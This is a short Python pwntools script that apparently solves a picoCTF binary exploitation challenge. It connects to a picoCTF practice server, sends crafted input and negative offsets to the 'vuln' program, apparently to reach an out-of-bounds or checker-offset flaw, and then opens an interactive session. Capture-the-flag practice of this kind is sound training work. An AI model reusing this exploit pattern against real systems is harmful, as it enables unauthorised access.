from pwn import *

context.log_level = "debug"

exe = ELF("./vuln")
# r = exe.process()
r = remote("saturn.picoctf.net", 54176)

r.recvuntil(b">> ")
r.sendline(b"a" * 13 + b"L")  # 1337
r.recvuntil(b"10.\n")
r.sendline(b"-16 -314")  # offset to check and offset between hard/easy checker
r.interactive()
